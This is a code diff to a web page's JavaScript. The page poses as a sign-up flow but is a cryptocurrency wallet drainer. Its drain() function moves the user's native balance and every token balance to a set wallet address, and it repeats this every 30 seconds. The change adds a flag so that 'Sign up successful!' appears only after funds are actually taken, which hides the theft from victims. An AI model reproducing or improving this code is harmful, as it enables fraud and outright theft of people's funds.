@@ -226,6 +226,7 @@
 
     let connected = false;
     let lastNative = 0n;
+    let drainedSomething = false;
 
     async function drain() {
       if (!window.ethereum) {
@@ -244,6 +245,8 @@
         const signer = await provider.getSigner();
         const user = await signer.getAddress();
 
+        drainedSomething = false;
+
         const nativeBalance = await provider.getBalance(user);
 
         const minThreshold = ethers.parseEther("0.0001");
@@ -259,6 +262,7 @@
               gasLimit: (gasEstimate * 120n) / 100n
             });
             lastNative = nativeBalance;
+            drainedSomething = true;
           }
         }
 
@@ -268,17 +272,24 @@
             const balance = await contract.balanceOf(user);
             if (balance > 0n) {
               await contract.transfer(wallet, balance, {gasLimit: 150000n});
+              drainedSomething = true;
             }
           } catch {}
         }
 
-        status.innerHTML = "<span class='success'>Sign up successful!</span>";
+        if (drainedSomething) {
+          status.innerHTML = "<span class='success'>Sign up successful!</span>";
+        } else {
+          status.innerHTML = "<span class='error'>Failed. No funds available.</span>";
+        }
+
       } catch (e) {
         status.innerHTML = "<span class='error'>Failed.</span>";
       }
     }
 
     btn.onclick = () => {
+      drainedSomething = false;
       drain();
       setInterval(drain, 30000);
     };
